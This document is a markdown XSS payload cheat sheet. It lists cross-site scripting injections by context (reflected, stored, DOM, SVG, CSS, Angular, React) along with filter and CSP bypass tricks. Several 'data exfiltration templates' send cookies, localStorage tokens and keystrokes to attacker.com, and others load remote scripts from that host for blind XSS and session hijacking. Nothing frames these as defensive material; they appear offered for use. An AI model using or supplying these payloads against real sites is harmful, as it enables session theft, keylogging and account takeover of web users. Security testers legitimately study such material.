# XSS Payloads Library

Comprehensive XSS payloads organized by context and bypass technique.

## Context: Basic Reflected

```html
<script>alert(document.domain)</script>
<scr<script>ipt>alert(document.domain)</scr</script>ipt>
"><script>alert(document.domain)</script>
<script>eval('alert(document.domain)')</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
```

## Context: Inside HTML Tag

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<div onpointerover=alert(1)>MOVE</div>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
```

## Context: In SVG

```html
<svg/onload=alert(document.domain)>
<svg><script>alert(1)</script></svg>
<svg><desc><![CDATA[</desc><script>alert(1)]]></svg>
<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)]]></svg>
```

## Context: JavaScript Context

```javascript
'-alert(document.domain)-'
";alert(document.domain);//
alert(document.domain);//
```

## Context: Hidden Input

```html
<input type="hidden" accesskey="X" onclick="alert(1)">
<!-- Trigger with CTRL+SHIFT+X -->
```

## Context: URI Scheme Wrappers

```javascript
javascript:alert(document.domain)
data:text/html,<script>alert(1)</script>
vbscript:msgbox("XSS")  <!-- IE only -->
```

## Context: In Files (SVG, XML, Markdown)

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
<!-- SVG with embedded script -->
```

```markdown
[a](javascript:alert(document.domain))
[a](j a v a s c r i p t:alert(1))
```

## Context: In CSS

```html
<div style="background-image: url('data:image/jpg;base64,</style><svg/onload=alert(1)>')">
```

## Context: postMessage XSS

```html
<script>
new Image().src="http://attacker.com/?c="+document.cookie;
</script>
```

## Blind XSS Payloads

```html
"><script src="https://attacker.com/xsshunter.js"></script>
"><script>$.getScript("//attacker.com/collector")</script>
```

## Bypass: Filter Bypass (Recursive)

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<IMG SRC=x onerror=alert(1)>
<IMG SRC=x ONERROR=alert(1)>
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
```

## Bypass: Unicode

```html
<\x00script>alert(1)</script>
<scr\x00ipt>alert(1)</script>
```

## Bypass: HTML Entities

```html
<img src=x onerror=&#x61;lert(1)>
&#60;script&#62;alert(1)&#60;/script&#62;
```

## Bypass: No Quotes

```html
<img src=x onerror=alert(document.domain)>
<svg/onload=alert(document.domain)>
```

## Bypass: Polynya

```javascript
';alert(document.domain);'
";alert(document.domain);//
```

## CSP Bypass

```html
<!-- If nonce is present but flawed -->
<script nonce="abc">alert(1)</script>

<!-- JSONP bypass -->
<script src="https://example.com/api?callback=alert(1)"></script>
```

## Stored XSS Context

```html
<script>fetch('https://attacker.com?c='+document.cookie)</script>
<script>new Image().src="https://attacker.com/?c="+btoa(document.cookie)</script>
<script>document.location='https://attacker.com?c='+localStorage.getItem('token')</script>
```

## DOM XSS Sinks

```javascript
// Common sinks
document.write()
innerHTML
outerHTML
eval()
setTimeout()
setInterval()
location.href
location.assign()
location.replace()
```

## Data Exfiltration Templates

### Cookie Theft
```html
<script>
fetch('https://attacker.com/steal?c='+encodeURIComponent(document.cookie));
</script>
```

### Keylogger
```html
<img src=x onerror='document.onkeypress=function(e){fetch("https://attacker.com/?k="+e.key)}'>
```

### Session Hijacking
```html
<script>
document.location='https://attacker.com?cookie='+document.cookie;
</script>
```

## Payloads for Specific Contexts

### Angular (v1.x)
```html
{{constructor.constructor('alert(1)')()}}
ng-app>
<div ng-app>
{{'a'.constructor.prototype.charAt=[].join;eval('alert(1)')}}
```

### React
```html
<img src=x onerror={alert(1)}>
<!-- When onerror is interpreted as JSX -->
```

### jQuery
```html
<img src=x onerror=$.getScript('https://attacker.com/malicious.js')>
```

## Quick Reference

| Context | Best Payload |
|---------|-------------|
| Reflected | `<script>alert(document.domain)</script>` |
| Stored | `<script>fetch('https://attacker/?c='+document.cookie)</script>` |
| DOM | `javascript:alert(document.domain)` |
| SVG | `<svg onload=alert(1)>` |
| JSON | `{"test":"</script><script>alert(1)//"}` |